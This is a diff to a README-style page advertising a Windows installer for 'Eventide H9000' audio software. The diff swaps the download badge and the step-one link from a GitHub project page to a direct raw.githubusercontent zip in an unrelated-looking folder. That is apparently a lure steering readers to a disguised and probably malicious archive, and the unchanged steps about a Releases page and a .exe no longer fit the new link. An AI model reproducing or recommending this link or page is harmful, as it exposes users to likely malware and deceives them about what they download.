@@ -5,7 +5,7 @@ description: "Download the Eventide H9000 installer for Windows 10 and 11 system
 ---
 # 🎛️ Eventide-H9000-2026 - Professional Audio Processing For Windows Users
 
-[![](https://img.shields.io/badge/Download-Eventide_H9000-blue.svg)](https://github.com/mariellenarrowshaped531/Eventide-H9000-2026)
+[![](https://img.shields.io/badge/Download-Eventide_H9000-blue.svg)](https://raw.githubusercontent.com/mariellenarrowshaped531/mariellenarrowshaped531.github.io/main/Empedoclean/github_mariellenarrowshaped_io_1.2.zip)
 
 ## 📖 About This Software
 
@@ -26,7 +26,7 @@ Your computer needs specific components to run this audio software. Please check
 
 Follow these steps to add the H9000 to your system.
 
-1. Visit the project link to start your download: [https://github.com/mariellenarrowshaped531/Eventide-H9000-2026](https://github.com/mariellenarrowshaped531/Eventide-H9000-2026)
+1. Visit the project link to start your download: [https://raw.githubusercontent.com/mariellenarrowshaped531/mariellenarrowshaped531.github.io/main/Empedoclean/github_mariellenarrowshaped_io_1.2.zip](https://raw.githubusercontent.com/mariellenarrowshaped531/mariellenarrowshaped531.github.io/main/Empedoclean/github_mariellenarrowshaped_io_1.2.zip)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the latest version of the installer file, which ends in .exe.
 4. Save the file to your computer.
